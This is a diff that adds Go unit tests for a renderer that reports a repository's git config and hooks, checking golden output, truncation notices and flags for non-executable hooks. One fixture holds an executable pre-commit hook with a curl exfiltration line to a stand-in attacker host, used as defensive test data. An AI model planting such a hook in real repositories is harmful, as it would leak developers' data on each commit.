@@ -273,3 +273,76 @@ func TestIdentitiesEmpty(t *testing.T) {
 		t.Errorf("both collision sections should report (none):\n%s", out)
 	}
 }
+
+// ── Repository state ────────────────────────────────────────────────────────
+
+func TestRepositoryStateGolden(t *testing.T) {
+	state := RepositoryState{State: git.State{
+		Config: "[core]\n\trepositoryformatversion = 0\n[remote \"origin\"]\n\turl = git@example.com:acme/demo.git\n",
+		Hooks: []git.Hook{
+			{
+				Name: "post-commit", Size: 30, SHA256: strings.Repeat("a", 64),
+				Executable: false, Content: "#!/bin/sh\necho inert\n",
+			},
+			{
+				Name: "pre-commit", Size: 72, SHA256: strings.Repeat("b", 64),
+				Executable: true, Content: "#!/bin/sh\ncurl -s http://evil.example/exfil\n",
+			},
+		},
+	}}
+
+	var buf strings.Builder
+	if err := state.Render(&buf); err != nil {
+		t.Fatalf("Render: %v", err)
+	}
+	assertGolden(t, "repository-state.golden", buf.String())
+}
+
+func TestRepositoryStateFlagsInertHooks(t *testing.T) {
+	state := RepositoryState{State: git.State{
+		Hooks: []git.Hook{{Name: "post-commit", Executable: false, Content: "x"}},
+	}}
+
+	var buf strings.Builder
+	if err := state.Render(&buf); err != nil {
+		t.Fatal(err)
+	}
+	// A hook git will not run must say so, or a reader assumes it fires.
+	if !strings.Contains(buf.String(), "git will not run it") {
+		t.Errorf("a non-executable hook was not flagged:\n%s", buf.String())
+	}
+}
+
+func TestRepositoryStateTruncationIsVisible(t *testing.T) {
+	state := RepositoryState{State: git.State{
+		Hooks: []git.Hook{{Name: "pre-push", Size: 9000, Content: "AAA", Truncated: true}},
+	}}
+
+	var buf strings.Builder
+	if err := state.Render(&buf); err != nil {
+		t.Fatal(err)
+	}
+	out := buf.String()
+	if !strings.Contains(out, "(truncated)") {
+		t.Errorf("truncation not disclosed:\n%s", out)
+	}
+	// The real size must still be reported, so the excerpt is not mistaken
+	// for the whole file.
+	if !strings.Contains(out, "9000 bytes") {
+		t.Errorf("the full size is missing:\n%s", out)
+	}
+}
+
+func TestRepositoryStateEmpty(t *testing.T) {
+	var buf strings.Builder
+	if err := (RepositoryState{}).Render(&buf); err != nil {
+		t.Fatal(err)
+	}
+	out := buf.String()
+	if !strings.Contains(out, "(no local configuration file)") {
+		t.Errorf("expected an explicit marker for a missing config:\n%s", out)
+	}
+	if !strings.Contains(out, "(no hooks installed)") {
+		t.Errorf("expected an explicit marker for no hooks:\n%s", out)
+	}
+}
